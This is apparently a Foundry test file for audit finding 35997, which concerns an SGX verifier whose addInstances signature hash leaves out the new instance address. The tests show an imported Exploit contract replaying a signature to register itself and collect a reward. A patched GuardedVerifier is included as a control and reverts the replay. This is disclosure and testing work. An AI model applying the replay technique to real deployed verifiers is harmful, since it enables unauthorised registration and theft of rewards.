// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Terms,
    RewardToken,
    SgxVerifier
} from "./35997-insufficient-signature-hashing-for-sgx-addinstances-sigmapri.sol";

/// Hash includes newInstance. A signature for one address cannot install another.
contract GuardedVerifier {
    RewardToken public token;
    mapping(uint256 => address) public instanceOf;
    error SGX_INVALID_INSTANCE();

    constructor(RewardToken _token) {
        token = _token;
    }

    function seed(uint256 id, address instance) external {
        instanceOf[id] = instance;
    }

    function addInstances(uint256 id, address newInstance, address[] calldata extraInstances, bytes calldata signature)
        external
    {
        bytes32 hash = keccak256(abi.encode("ADD_INSTANCES", newInstance, extraInstances));
        address oldInstance = _recover(hash, signature);
        if (oldInstance == address(0) || instanceOf[id] != oldInstance) revert SGX_INVALID_INSTANCE();
        instanceOf[id] = newInstance;
    }

    function _recover(bytes32 hash, bytes calldata signature) private pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        return ecrecover(hash, v, r, s);
    }
}

contract Finding35997Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 constant SIGNER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    address constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address constant TOKEN = 0x8ea53755A6CB335DD77e8DfBE91078CF210015C7;
    address constant VERIFIER = 0x671D353A77015fA0B747f24eb2a50b0E3340BD1d;
    address constant HONEST = 0x000000000000000000000000000000000000B0B5;

    function _deploy() internal returns (Exploit e) {
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        e = new Exploit();
    }

    function test_embedded_signature_is_the_instance_key() public {
        Exploit e = _deploy();
        address[] memory extras = new address[](0);
        bytes32 hash = e.verifier().signedHash(extras);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PK, hash);
        assertEq(abi.encodePacked(r, s, v), e.signature(), "sig");
        assertEq(vm.addr(SIGNER_PK), Terms.SIGNER, "signer");
    }

    function test_unsigned_instance_is_registered_and_paid() public {
        Exploit e = _deploy();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.token()), TOKEN, "token");
        assertEq(address(e.verifier()), VERIFIER, "verifier");
        e.run();

        emit log_named_uint("payout", e.payout());
        emit log_named_uint("registered", e.registered());

        assertEq(e.registered(), 1, "registered");
        assertEq(e.payout(), Terms.REWARD, "payout");
        assertEq(e.token().balanceOf(address(e)), Terms.REWARD, "balance");
        assertEq(e.verifier().instanceOf(Terms.ID), address(e), "instance");
    }

    function test_control_hashes_instance_second_add_reverts() public {
        RewardToken token = new RewardToken();
        GuardedVerifier guarded = new GuardedVerifier(token);
        guarded.seed(Terms.ID, Terms.SIGNER);

        address[] memory extras = new address[](0);
        bytes32 hash = keccak256(abi.encode("ADD_INSTANCES", HONEST, extras));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PK, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        guarded.addInstances(Terms.ID, HONEST, extras, sig);
        assertEq(guarded.instanceOf(Terms.ID), HONEST, "honest");

        vm.expectRevert(GuardedVerifier.SGX_INVALID_INSTANCE.selector);
        guarded.addInstances(Terms.ID, address(this), extras, sig);
        assertEq(guarded.instanceOf(Terms.ID), HONEST, "attacker not installed");
        assertEq(token.balanceOf(address(this)), 0, "no payout");
    }
}
